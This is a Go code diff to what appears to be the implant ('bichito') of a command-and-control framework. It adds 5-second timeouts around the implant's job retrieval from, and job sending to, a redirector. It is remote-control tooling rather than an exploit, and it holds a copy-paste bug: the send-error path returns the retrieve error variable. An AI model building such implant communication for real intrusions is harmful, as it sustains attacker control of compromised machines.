@@ -10,6 +10,7 @@ import (
 	"bichito/modules/biterpreter"
 	"fmt"
 	"bytes"
+	"time"
 )
 
 
@@ -67,11 +68,32 @@ func connectOut() string{
 		sysinfo = true
 	}
 
-	//Get Any Jobs from Bots targeting this redirector
-	encodedJobs,error = network.RetrieveJobs(redirectors[0],authbearer)
-	if error != "Success"{
-		return error
+	//5 sec Timeout to perform Job retrieve
+	var retrieveError string
+	retrieveTimeout := time.NewTimer(time.Duration(5) * time.Second)
+	retrieveErr := make(chan string, 1)
+	retrieveCont := make(chan string, 1)
+
+	go func(){
+	
+		//Get Any Jobs from Bots targeting this redirector
+		encodedJobs,error = network.RetrieveJobs(redirectors[0],authbearer)
+		if error != "Success"{
+			retrieveError = error
+			retrieveErr <- "error"
+		}
+
+		retrieveCont <- "continue"
+
+	}()
+	select{
+		case <- retrieveCont:
+		case <- retrieveErr:
+			return retrieveError			
+		case <- retrieveTimeout.C:
+			return "Retrieve Jobs from Redirector Timeout"		
 	}
+
 
 	errD := json.Unmarshal(encodedJobs,&newJobs)
 	//decoder := json.NewDecoder(encodedJobs)
@@ -90,14 +112,34 @@ func connectOut() string{
 	defer jobsToHive.mux.Unlock()
 
 
-		//Encode Jobs
-		bufRC := new(bytes.Buffer)
-		json.NewEncoder(bufRC).Encode(jobsToHive.Jobs)
-		jobsToHi := bufRC.String()
+	//Encode Jobs
+	bufRC := new(bytes.Buffer)
+	json.NewEncoder(bufRC).Encode(jobsToHive.Jobs)
+	jobsToHi := bufRC.String()
+
+	//5 sec Timeout to perform Job Sending
+	var sendError string
+	sendTimeout := time.NewTimer(time.Duration(5) * time.Second)
+	sendErr := make(chan string, 1)
+	sendCont := make(chan string, 1)
+
+	go func(){
 		error = network.SendJobs(redirectors[0],authbearer,[]byte(jobsToHi))
 		if error != "Success"{
-			return error
+			sendError = error
+			sendErr <- "error"
 		}
+
+		sendCont <- "continue"
+	}()
+	select{
+		case <- sendCont:
+		case <- sendErr:
+			return retrieveError			
+		case <- sendTimeout.C:
+			return "Send Jobs to Redirector Timeout"		
+	}
+
 
 	jobsToHive.Jobs = jobsToHive.Jobs[:0]
 
